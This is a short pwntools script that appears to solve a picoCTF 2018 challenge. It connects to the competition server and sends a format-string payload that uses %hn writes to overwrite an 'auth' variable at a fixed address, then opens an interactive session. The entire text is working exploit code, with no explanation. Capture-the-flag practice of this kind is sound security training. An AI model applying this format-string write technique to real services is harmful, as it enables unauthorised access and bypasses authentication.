from pwn import *

s=remote("2018shell2.picoctf.com",27114)
auth = 0x804a04c
payload = ""
payload += p32(auth)+p32(auth+2)+"%1x%11$hn"+"%1x%12$hn"
#print payload 
s.sendline(payload)
s.interactive()
